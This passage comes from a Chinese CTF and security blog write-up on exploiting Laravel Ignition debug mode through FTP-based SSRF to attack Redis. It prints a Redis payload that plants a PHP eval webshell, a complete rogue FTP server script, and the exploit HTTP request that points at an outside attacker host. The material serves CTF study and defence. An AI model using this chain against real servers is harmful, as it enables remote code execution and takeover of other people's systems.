&quot;</span>)</span><br><span class="line">    cmd+=CRLF</span><br><span class="line">    <span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">        payload += urllib.quote(redis_format(x))</span><br><span class="line">    <span class="built_in">print</span> payload</span><br></pre></td></tr></table></figure>
+<p>生成的 payload 只取 <code>_</code> 后面的数据部分：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">%2A1%0D%0A%<span class="number">248</span>%0D%0Aflushall%0D%0A%2A3%0D%0A%<span class="number">243</span>%0D%0Aset%0D%0A%<span class="number">241</span>%0D%0A1%0D%0A%<span class="number">2435</span>%0D%0A%0A%0A%3C%3Fphp%20<span class="built_in">eval</span>%<span class="number">28</span>%24_POST%5B%22whoami%<span class="number">22</span>%5D%<span class="number">29</span>%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%<span class="number">246</span>%0D%0Aconfig%0D%0A%<span class="number">243</span>%0D%0Aset%0D%0A%<span class="number">243</span>%0D%0Adir%0D%0A%<span class="number">2420</span>%0D%0A/var/www/html/public%0D%0A%2A4%0D%0A%<span class="number">246</span>%0D%0Aconfig%0D%0A%<span class="number">243</span>%0D%0Aset%0D%0A%<span class="number">2410</span>%0D%0Adbfilename%0D%0A%<span class="number">249</span>%0D%0Ashell.php%0D%0A%2A1%0D%0A%<span class="number">244</span>%0D%0Asave%0D%0A</span><br></pre></td></tr></table></figure>
+<p>然后在攻击机上搭建一个恶意的 FTP 服务，并将上面的 Payload 中的数据替换掉下面 FTP 脚本中的 Payload 的内容：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2021/1/13 6:56 下午</span></span><br><span class="line"><span class="comment"># @Author  : tntaxin</span></span><br><span class="line"><span class="comment"># @File    : ftp_redirect.py</span></span><br><span class="line"><span class="comment"># @Software:</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> unquote</span><br><span class="line"></span><br><span class="line"><span class="comment"># 对gopherus生成的payload进行一次urldecode</span></span><br><span class="line">payload = unquote(<span class="string">&quot;%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2435%0D%0A%0A%0A%3C%3Fphp%20eval%28%24_POST%5B%22whoami%22%5D%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2420%0D%0A/var/www/html/public%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A&quot;</span>)</span><br><span class="line">payload = payload.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">host = <span class="string">&#x27;0.0.0.0&#x27;</span></span><br><span class="line">port = <span class="number">23</span></span><br><span class="line">sk = socket.socket()</span><br><span class="line">sk.bind((host, port))</span><br><span class="line">sk.listen(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ftp被动模式的passvie port,监听到1234</span></span><br><span class="line">sk2 = socket.socket()</span><br><span class="line">sk2.bind((host, <span class="number">2333</span>))</span><br><span class="line">sk2.listen()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计数器，用于区分是第几次ftp连接</span></span><br><span class="line">count = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    conn, address = sk.accept()</span><br><span class="line">    conn.send(<span class="string">b&quot;200 \n&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(conn.recv(<span class="number">20</span>))  <span class="comment"># USER aaa\r\n  客户端传来用户名</span></span><br><span class="line">    <span class="keyword">if</span> count == <span class="number">1</span>:</span><br><span class="line">        conn.send(<span class="string">b&quot;220 ready\n&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        conn.send(<span class="string">b&quot;200 ready\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(conn.recv(<span class="number">20</span>))   <span class="comment"># TYPE I\r\n  客户端告诉服务端以什么格式传输数据，TYPE I表示二进制， TYPE A表示文本</span></span><br><span class="line">    <span class="keyword">if</span> count == <span class="number">1</span>:</span><br><span class="line">        conn.send(<span class="string">b&quot;215 \n&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        conn.send(<span class="string">b&quot;200 \n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(conn.recv(<span class="number">20</span>))  <span class="comment"># SIZE /123\r\n  客户端询问文件/123的大小</span></span><br><span class="line">    <span class="keyword">if</span> count == <span class="number">1</span>:</span><br><span class="line">        conn.send(<span class="string">b&quot;213 3 \n&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        conn.send(<span class="string">b&quot;300 \n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(conn.recv(<span class="number">20</span>))  <span class="comment"># EPSV\r\n&#x27;</span></span><br><span class="line">    conn.send(<span class="string">b&quot;200 \n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(conn.recv(<span class="number">20</span>))   <span class="comment"># PASV\r\n  客户端告诉服务端进入被动连接模式</span></span><br><span class="line">    <span class="keyword">if</span> count == <span class="number">1</span>:</span><br><span class="line">        conn.send(<span class="string">b&quot;227 47,101,57,72,0,2333\n&quot;</span>)  <span class="comment"># 服务端告诉客户端需要到那个ip:port去获取数据,ip,port都是用逗号隔开，其中端口的计算规则为：4*256+210=1234</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        conn.send(<span class="string">b&quot;227 127,0,0,1,0,6379\n&quot;</span>)  <span class="comment"># 端口计算规则：35*256+40=9000</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(conn.recv(<span class="number">20</span>))  <span class="comment"># 第一次连接会收到命令RETR /123\r\n，第二次连接会收到STOR /123\r\n</span></span><br><span class="line">    <span class="keyword">if</span> count == <span class="number">1</span>:</span><br><span class="line">        conn.send(<span class="string">b&quot;125 \n&quot;</span>) <span class="comment"># 告诉客户端可以开始数据链接了</span></span><br><span class="line">        <span class="comment"># 新建一个socket给服务端返回我们的payload</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;建立连接!&quot;</span>)</span><br><span class="line">        conn2, address2 = sk2.accept()</span><br><span class="line">        conn2.send(payload)</span><br><span class="line">        conn2.close()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;断开连接!&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        conn.send(<span class="string">b&quot;150 \n&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(conn.recv(<span class="number">20</span>))</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 第一次连接是下载文件，需要告诉客户端下载已经结束</span></span><br><span class="line">    <span class="keyword">if</span> count == <span class="number">1</span>:</span><br><span class="line">        conn.send(<span class="string">b&quot;226 \n&quot;</span>)</span><br><span class="line">    conn.close()</span><br><span class="line">    count += <span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>这个脚本做的事情很简单，就是当客户端第一次连接的时候返回我们预设的 Payload；当客户端第二次连接的时候将客户端的连接重定向到 127.0.0.1:6379，也就是目标主机上 Redis 服务的端口，从而造成 SSRF，攻击其 Redis。</p>
+<p>运行 ftp_redirect.py：</p>
+<p><img src="https://p0.ssl.qhimg.com/t010e57181bca5ddd9c.png" alt="img"></p>
+<p>然后发送请求就行了：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">POST /_ignition/execute-solution HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">192.168</span><span class="number">.41</span><span class="number">.107</span>:<span class="number">8077</span></span><br><span class="line">Content-<span class="type">Type</span>: application/json</span><br><span class="line">Content-Length: <span class="number">190</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;solution&quot;</span>: <span class="string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;</span>,</span><br><span class="line">  <span class="string">&quot;parameters&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;variableName&quot;</span>: <span class="string">&quot;username&quot;</span>,</span><br><span class="line">    <span class="string">&quot;viewFile&quot;</span>: <span class="string">&quot;ftp://aaa@47.101.57.72:23/123&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://p2.ssl.qhimg.com/t01af779f700cb38433.png" alt="img"></p>
+<p>执行后，成功写入 Webshell，然后读取 flag 就行了：</p>
+<p><img src="https://p1.ssl.qhimg.com/t0155c2eabe534cd30b.png" alt="img"></p>
+</article><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/img/24.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/08/29/cms/" title="cms"><img class="cover" src="/img/24.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">cms</div></div></a></div><div class="next-post pull-right"><a href="/2023/08/28/docker/" title="docker"><img class="cover" src="/img/24.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">docker</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/18.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">dionysus</div><div class="author-info__description">我醉欲眠卿且去</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">43</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/MoonlitSyntax"><i class="fab fa-github"></i><span>此心安处</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="/img/wechat.png" target="_blank" title="微信"><i class="iconfont  icon-weixin"></i></a><a class="social-icon" href="https://res.abeim.cn/api/qq/?qq=1475856026" target="_blank" title="QQ"><i class="iconfont icon-QQ"></i></a><a class="social-icon" href="https://space.bilibili.com/430091327?spm_id_from=333.1007.0.0" target="_blank" title="bilibili"><i class="iconfont icon-bilibili"></i></a><a class="social-icon" href="mailto:1475856026@qq.com" target="_blank" title="QQ邮箱"><i class="iconfont icon-youxiang"></i></a><a class="social-icon" href="https://chat.openai.com" target="_blank" title="chatgpt"><i class="iconfont icon-ai"></i></a><a class="social-icon" href="https://www.luogu.com.cn" target="_blank" title="洛谷"><i class="iconfont icon-code"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><a class="faa-parent animated-hover"><svg class="faa-tada icon" style="height:25px;width:25px;fill:currentColor;position:relative;top:5px" aria-hidden="true"><use xlink:href="#icon-pinglun-1"></use></svg></a><span>今日诗词</span></div><div class="announcement_content"><script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script> <div id="poem_sentence"></div> <div id="poem_info"></div> <script type="text/javascript">
+  jinrishici.load(function(result) {
+    var sentence = document.querySelector("#poem_sentence")
+    var info = document.querySelector("#poem_info")
+
+    var content = result.data.origin.content;
+
+    // 分割诗句为数组
+    var splitContent = [];
+    content.forEach(line => {
+        var phrases = line.split(/([。，])/);
+        for (var i = 0; i < phrases.length; i += 2) {
+            var phrase = phrases[i];
+            if (i + 1 < phrases.length) {
+                phrase += phrases[i + 1];
+            }
+            splitContent.push(phrase);
+        }
+    });
+
+    // 构建新的诗句
+    var newContent = "";
+    var line = "";
+    for (var i = 0; i < splitContent.length; i++) {
+        if (line.length + splitContent[i].length <= 15) {
+            line += splitContent[i];
+        } else {
+            newContent += line + '<br>';
+            line = splitContent[i];
+        }
+    }
+    newContent += line;
+
+    sentence.innerHTML = newContent;
+    info.innerHTML = '【' + result.data.origin.dynasty + '】' + result.data.origin.author + '《' + result.data.origin.title + '》';
+  });
+</script>
+</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B4%BB%E5%AD%A6%E6%B4%BB%E7%94%A8"><span class="toc-number">1.</span> <span class="toc-text">活学活用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Laravel-Debug-mode-FTP-SSRF-to-RCE"><span class="toc-number">1.1.</span> <span class="toc-text">Laravel Debug mode &amp;&amp; FTP SSRF to RCE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2021-%E7%BE%8A%E5%9F%8E%E6%9D%AFCTF-Cross-The-Side"><span class="toc-number">1.2.</span> <span class="toc-text">[2021 羊城杯CTF]Cross The Side</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/09/10/htb/" title="htb"><img src="/img/24.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="htb"/></a><div class="content"><a class="title" href="/2023/09/10/htb/" title="htb">htb</a><time datetime="2023-09-10T10:10:41.000Z" title="发表于 2023-09-10 18:10:41">2023-09-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/09/09/Untitled/" title="无题"><img src="/img/24.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="无题"/></a><div class="content"><a class="title" href="/2023/09/09/Untitled/" title="无题">无题</a><time datetime="2023-09-09T09:37:05.104Z" title="发表于 2023-09-09 17:37:05">2023-09-09</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/09/07/a/" title="无题"><img src="/img/24.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="无题"/></a><div class="content"><a class="title" href="/2023/09/07/a/" title="无题">无题</a><time datetime="2023-09-07T11:42:42.122Z" title="发表于 2023-09-07 19:42:42">2023-09-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/09/07/java/" title="java"><img src="/img/24.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="java"/></a><div class="content"><a class="title" href="/2023/09/07/java/" title="java">java</a><time datetime="2023-09-07T08:08:17.000Z" title="发表于 2023-09-07 16:08:17">2023-09-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/08/31/%E5%85%8D%E6%9D%80%E9%A9%AC/" title="免杀马"><img src="/img/24.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="免杀马"/></a><div class="content"><a class="title" href="/2023/08/31/%E5%85%8D%E6%9D%80%E9%A9%AC/" title="免杀马">免杀马</a><time datetime="2023-08-31T09:43:18.000Z" title="发表于 2023-08-31 17:43:18">2023-08-31</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2023 By dionysus</div><div class="footer_custom_text">此心安处是吾乡</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><script>function panguFn () {
+  if (typeof pangu === 'object') pangu.autoSpacingPage()
+  else {
+    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
+      .then(() => {
+        pangu.autoSpacingPage()
+      })
+  }
+}
+
+function panguInit () {
+  if (true){
+    GLOBAL_CONFIG_SITE.isPost && panguFn()
+  } else {
+    panguFn()
+  }
+}
+
+document.addEventListener('DOMContentLoaded', panguInit)</script><div class="js-pjax"></div><canvas id="snow"></canvas><script async src="/js/snow.js"></script><script async src="//at.alicdn.com/t/c/font_4186045_vjy9vudusnm.js"></script><script async data-pjax src="/js/randombg.js"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><div id="algolia-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="search-wrap"><div id="algolia-search-input"></div><hr/><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-info"><div class="algolia-stats"></div><div class="algolia-poweredBy"></div></div></div></div></div><div id="search-mask"></div><script src="https://cdn.jsdelivr.net/npm/algoliasearch/dist/algoliasearch-lite.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instantsearch.js/dist/instantsearch.production.min.js"></script><script src="/js/search/algolia.js"></script></div></div><!-- hexo injector body_end start --><script async src="//at.alicdn.com/t/c/font_4186045_vjy9vudusnm.js"></script><!-- hexo injector body_end end --></body></html>
